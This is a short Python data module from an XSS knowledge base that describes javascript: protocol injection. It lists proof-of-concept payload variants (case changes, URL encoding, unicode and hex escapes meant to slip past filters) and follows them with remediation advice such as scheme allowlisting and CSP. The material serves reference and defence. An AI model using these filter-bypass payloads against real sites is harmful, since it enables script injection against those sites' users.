#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Created
Telegram: https://t.me/EasyProTech

javascript: Protocol Variants Context - Data Module
"""

DESCRIPTION = """
javascript: protocol allows executing JavaScript in URLs.
Various encoding and format variants can be exploited for XSS when user input
is injected into javascript: URLs, allowing execution of arbitrary JavaScript.

Vulnerability occurs when:
- User-controlled data is injected into javascript: URLs
- Protocol encoding is bypassed
- URL encoding variants bypass filters
- Protocol case variations are used
- Protocol is combined with other schemes

Common variants:
- javascript:alert(1)
- javascript:void(0);alert(1)
- javascript:alert(String.fromCharCode(88,83,83))
- javascript:alert('XSS')
- JaVaScRiPt:alert(1)
- javascript%3Aalert(1)
"""

ATTACK_VECTOR = """
1. Basic javascript: protocol:
   javascript:USER_INPUT

2. Void variant:
   javascript:void(0);USER_INPUT

3. Encoded variant:
   javascript%3AUSER_INPUT

4. Case variation:
   JaVaScRiPt:USER_INPUT

5. Unicode variant:
   javascript:\u0061lert(1)

6. Hex encoded:
   javascript:\x61lert(1)
"""

REMEDIATION = """
1. Never allow user input in javascript: URLs
2. Block javascript: protocol in URL validation
3. Normalize URLs before validation
4. Use Content Security Policy (CSP)
5. Sanitize all URLs before use
6. Validate URL schemes against allowlist
7. Audit all URL handling code for user input
8. Use framework-safe URL handling
"""
